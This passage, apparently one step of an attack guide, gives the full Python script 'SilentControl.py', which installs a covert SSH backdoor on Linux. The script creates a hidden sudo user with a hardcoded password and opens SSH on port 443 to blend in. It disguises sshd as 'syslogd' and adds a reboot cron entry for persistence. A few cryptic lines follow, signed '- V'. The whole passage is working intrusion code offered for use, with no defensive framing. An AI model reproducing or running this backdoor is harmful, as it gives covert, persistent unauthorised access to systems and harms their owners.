
---

## **🔹 Step 3 – Uploading the Code (SilentControl.py)**  

### **`SilentControl.py` – The Code Itself**  
```python
import os
import subprocess
import time

HIDDEN_USER = "sysdaemon"
SSH_PORT = 443  # Uses HTTPS port to blend in

def create_hidden_user():
    """ Adds a stealth SSH user with root privileges """
    print(f"[*] Creating hidden SSH user: {HIDDEN_USER}...")
    os.system(f"useradd -m -s /bin/bash {HIDDEN_USER}")
    os.system(f"echo '{HIDDEN_USER}:P@ssw0rd123' | chpasswd")
    os.system(f"usermod -aG sudo {HIDDEN_USER}")

def enable_hidden_ssh():
    """ Configures SSHD to listen on an alternate, unnoticed port """
    print("[*] Modifying SSH configuration for stealth mode...")
    os.system(f"echo 'Port {SSH_PORT}' >> /etc/ssh/sshd_config")
    os.system("systemctl restart sshd")

def hide_process():
    """ Hides SSH activity by renaming it to a system process """
    print("[*] Hiding SSH backdoor in system processes...")
    os.system("cp /usr/sbin/sshd /usr/bin/syslogd")
    os.system("systemctl restart sshd")

def persistence():
    """ Ensures the backdoor survives reboots """
    print("[*] Setting up persistence...")
    cron_job = f"@reboot root /usr/bin/syslogd"
    os.system(f"echo '{cron_job}' >> /etc/crontab")

def main():
    create_hidden_user()
    enable_hidden_ssh()
    hide_process()
    persistence()
    print("[*] SilentControl installation complete. SSH backdoor is active.")

if __name__ == "__main__":
    main()
# A door that opens once never truly closes.
# A system that listens will always hear its master.
# If you hold the key, you are never locked out.
# - V
